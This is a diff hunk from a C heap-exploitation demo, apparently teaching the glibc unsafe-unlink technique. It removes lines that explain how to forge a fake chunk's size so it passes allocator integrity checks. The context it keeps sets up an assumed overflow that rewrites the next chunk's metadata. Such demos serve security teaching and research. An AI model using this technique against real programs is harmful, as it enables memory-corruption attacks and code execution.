@@ -32,18 +32,6 @@ int main()
 	fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
 	fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
 
-	fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");
-	fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");
-	fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))\n");
-	fprintf(stderr, "If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).\n");
-	fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");
-	fprintf(stderr, "1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");
-	fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");
-	fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");
-	chunk0_ptr[1] = sizeof(size_t);
-	fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr->size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &chunk0_ptr[1]);
-	fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");
-
 	fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
 	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
 	fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
